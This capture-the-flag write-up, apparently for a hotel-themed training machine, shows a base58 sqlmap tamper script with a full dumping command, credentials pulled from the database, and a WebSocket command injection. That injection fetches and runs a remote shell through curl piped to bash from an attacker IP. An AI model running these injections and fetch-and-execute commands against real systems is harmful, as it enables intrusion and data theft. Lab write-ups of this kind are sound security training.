
# PORT SCAN
---


| PORT | SERVICE |
| :--- | :------ |
| 80   | HTTP    |
| 4346 | HTTP    |



# RECONNAISSANCE
---

If we check the web application at port 80, we can find this:


![Pasted image 20250702155653.png](../../IMAGES/Pasted%20image%2020250702155653.png)

We got some utilities, if we try booking a room, this happens:


![Pasted image 20250702155725.png](../../IMAGES/Pasted%20image%2020250702155725.png)



We get an alert saying the hotel is currently fully booked, that's weird, let's check other functionalities:

![Pasted image 20250702161606.png](../../IMAGES/Pasted%20image%2020250702161606.png)


![Pasted image 20250702161616.png](../../IMAGES/Pasted%20image%2020250702161616.png)

Let's check the other port:

![Pasted image 20250702164915.png](../../IMAGES/Pasted%20image%2020250702164915.png)

Nothing we can do yet, no credentials. Our best chance is the other web application.

Ok, we got some info, if we check source code, we can find this:


![Pasted image 20250702161710.png](../../IMAGES/Pasted%20image%2020250702161710.png)

There's a call to `check-rooms.js`:

![Pasted image 20250702161728.png](../../IMAGES/Pasted%20image%2020250702161728.png)

The script pulls in the current room count from `/api/rooms-available`, turns on the â€œ#bookingâ€ button, and then wires up its click handler: if fewer than 6 rooms are reported it sends you straight to `new-booking`, otherwise it pops up an alert saying the hotelâ€™s fully booked.

Let's interact with the API: 

```bash
curl -s -X GET http://10.10.129.203/api/rooms-available
6
```

Not much we can do with it, we can check `new-booking` though:

![Pasted image 20250702162514.png](../../IMAGES/Pasted%20image%2020250702162514.png)



![Pasted image 20250702162458.png](../../IMAGES/Pasted%20image%2020250702162458.png)



![Pasted image 20250702162544.png](../../IMAGES/Pasted%20image%2020250702162544.png)

This script defines a `getCookie` helper to extract a named cookieâ€™s value, then uses it to retrieve the `BOOKING_KEY` from `document.cookie`. It sends a GET request to `/api/booking-info?booking_key=<key>`, parses the JSON response, and autoâ€‘fills the form fields `#rooms` with `data.room_num` and `#nights` with `data.days`, effectively preâ€‘populating the booking form based on the stored booking key.

As seen, we can notice the `BOOKING_KEY` cookie on our browser:

![Pasted image 20250702162749.png](../../IMAGES/Pasted%20image%2020250702162749.png)

This is base58 encoding, if we use cyberchef, we can notice this:

![Pasted image 20250702162847.png](../../IMAGES/Pasted%20image%2020250702162847.png)

We got:

```
booking_id:9148112
```

Let's interact with the API, for now, we can begin exploitation phase.


# EXPLOITATION
---

We can interact with the API using curl or a proxy, I'll use caido:


![Pasted image 20250702163137.png](../../IMAGES/Pasted%20image%2020250702163137.png)

It says not found, let's try sending another stuff as the key, maybe `LFI` or `SQLI` works, even `SSRF`:

![Pasted image 20250702163549.png](../../IMAGES/Pasted%20image%2020250702163549.png)

![Pasted image 20250702163351.png](../../IMAGES/Pasted%20image%2020250702163351.png)

LFI doesn't work here, I tried some payloads but no luck, let's try `SQLI`:

![Pasted image 20250702163611.png](../../IMAGES/Pasted%20image%2020250702163611.png)


![Pasted image 20250702163714.png](../../IMAGES/Pasted%20image%2020250702163714.png)

No bad request so it may work, let's try to enumerate the number of rows by using `order by`:

![Pasted image 20250702163810.png](../../IMAGES/Pasted%20image%2020250702163810.png)

![Pasted image 20250702163858.png](../../IMAGES/Pasted%20image%2020250702163858.png)

![Pasted image 20250702163911.png](../../IMAGES/Pasted%20image%2020250702163911.png)

On `3` we get a bad request, which means that SQLI is possible, we can automate the process with `sqlmap` but we need a tamper, a tamper is a little Python hook that sits between the tool and the target, grabbing every injection payload sqlmap generates and transforming it before itâ€™s sent. we need it thanks to the `base58` format, let's use this script:

```python
from lib.core.enums import PRIORITY
import base58

__priority__ = PRIORITY.HIGHEST

def tamper(payload, **kwargs):
    """
    Encode the payload with base58 :)
    """
    if payload:
        prefixed_payload = f"booking_id:{payload}"
        encoded_payload = base58.b58encode(prefixed_payload.encode()).decode()
        return encoded_payload
    return payload
```

Now, we need to create a tamper.py file with those contents and an `__init__.py` file too, once we do it, we can send the following `sqlmap` command:

```bash
sqlmap -u "http://IP/api/booking-info?booking_key=" -p "booking_key" --tamper=PATH TO TAMPER.PY/tamper.py --dbms=sqlite --technique=U --string="not found" --random-agent --level=5 --risk=3 --dump -batch
```


Make sure you got `base58` on pip before using the command:

```
pip install base58
```

We can see this:

![Pasted image 20250702164805.png](../../IMAGES/Pasted%20image%2020250702164805.png)


There are some credentials:

```
pdenton:4321chameleon
```

We can use them on the 4346 port web application:


![Pasted image 20250702165049.png](../../IMAGES/Pasted%20image%2020250702165049.png)


There's a message from `SweetCharity` to our user, we can see this on the source code:

![Pasted image 20250702165158.png](../../IMAGES/Pasted%20image%2020250702165158.png)

There's a `js` script embedded, let's beautify it:

```js
let elems = document.querySelectorAll(".email_list .row");
for (var i = 0; i < elems.length; i++) {
    elems[i].addEventListener("click", (e => {
        document.querySelector(".email_list .selected").classList.remove("selected"), e.target.parentElement.classList.add("selected");
        let t = e.target.parentElement.getAttribute("data-id"),
            n = e.target.parentElement.querySelector(".col_from").innerText,
            r = e.target.parentElement.querySelector(".col_subject").innerText;
        document.querySelector("#from_header").innerText = n, document.querySelector("#subj_header").innerText = r, document.querySelector("#email_content").innerText = "", fetch("/api/message?message_id=" + t).then((e => e.text())).then((e => {
            document.querySelector("#email_content").innerText = atob(e)
        }))
    })), document.querySelector(".dialog_controls button").addEventListener("click", (e => {
        e.preventDefault(), window.location.href = "/"
    }))
}
const wsUri = `ws://${location.host}/ws`;
socket = new WebSocket(wsUri);
let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
socket.onmessage = e => document.querySelector(".time").innerText = e.data, setInterval((() => socket.send(tz)), 1e3);
```

This snippet first grabs every row in the â€œ.email_listâ€ and wires up a click handler so that when a row is clicked it: 

1) removes the â€œselectedâ€ class from whatever was highlighted and adds it to the clicked row, 
2) pulls out that rowâ€™s `data-id`, sender name, and subject text, 
3) updates the headers on the page, and 
4) does a GET to `/api/message?message_id=<id>`, reads the plainâ€‘text (which is Base64â€‘encoded), decodes it with `atob()`, and dumps it into the message body area. It also hooks a â€œbackâ€ button to redirect to â€œ/â€ and opens a WebSocket to `ws://<host>/ws`, sending the browserâ€™s time zone string every second and updating a â€œ.timeâ€ element with whatever the server pushes back.


Due to the format of `/message?message_id=id`, we may be able to fuzz, let's automate the process on Caido:


![Pasted image 20250702165550.png](../../IMAGES/Pasted%20image%2020250702165550.png)

![Pasted image 20250702165616.png](../../IMAGES/Pasted%20image%2020250702165616.png)

5 messages got `200` status code, let's check them:

```
From: KVORK, Inc.//NYCNET.89.09.64.53
To: Multiple Recipients
Subject: SPAM: Tired of life?

Hello Friend,

Has life become too impersonal, too tedius, too painful for you?  Then now is
the time to exert control, to make that decision which is ultimately the only
real choice we ever have: the decision to die.

Some may describe this as an act of selfishness, but with the dwindling
reserves of natural resources throughout the world you're actually
contributing to the well-being of all those around you.  A recent bill passed
by the United States Congress even authorizes a one-time payment of c10,000 to
your chosen benefactor upon passing away.

So do yourself, your family, and your friends a favor and visit any one of the
KVORK, Inc. clinics in a neighborhood near you. We'll help you make a
difference - quickly and quietly.

Sincerely,

Derek Schmitt
Director of Development, KVORK, inc.
```

```
From: JReyes//UNATCO.00973.20892
To: Paul Denton//NYCNET.33.34.4346
Subject: Settled in yet?

Hey JC,

Thought I'd help you unload your boxes, but I'm tied down trying to get one of
the medical analyzers working.  Damn thing nearly lasered off one of my fingers!
Catch you later for a beer maybe?

Oh, and here's a flag: thm{adb5b797ee0d01a8c052dbee46fbc065e8c52afd}

Jaime
```

```
Your message:

To: juan//NYCNET.7786.786658
Subject: Your Results
Sent: Wed 14:18:59 -0600

Did not reach the following recipient(s):

juan//HK2net.7786.786658 on Wed, 14:26:35 -0600
Unable to deliver message due to a communications failure
MPSEXCH:IMS: New York Net: BORONTYPE:ADA 0 (000C05A6) Unknown Recipient

Message as follows:

>I'm definitely worried about the test results; there are
>some implications there that I'm afraid to pursue too
>much further.  I'll talk to Tracer.  Proceed with caution.
>
>-P
```

```
From: ClassicMovies.pcx3345:ABS
To: Paul Denton//NYCNET.33.34.4346
Subject: Account Verification

Mr. Denton:

We've recieved your order for "Blue Harvest" and "See You Next Wednesday."  At
your earliest possible convenience, please remit c110 at which point they will
be shipped immediately.

 Thanks for your business,

 Marcy Plaigrond
 Vibrant Videos, Inc.
```

That's all we can find for the id fuzzing part, if we remember the script opens a `websocket`, we can manipulate this WebSocket to execute commands using:

```
socket.send
```

This works with `"$()"`, thanks to command injection, if we send:

```
socket.send("$(ls)")
```

We can see a `bin` on top, which goes away pretty quickly, this means that command injection is possible, so, getting a shell is possible too, in order to get a shell, we can use `busybox` or create a `index.html` file with these contents:



Now, we need to host it using a python server and use curl to get the file, once the file downloads, we need to use bash to execute it, we can do all this with the following command:

```
socket.send("$(curl http://10.14.21.28/shell|bash)")
```

>Note: Make sure to use only ports `80` and `443` because the server is only able to reach them on those ports:





# PRIVILEGE ESCALATION
---


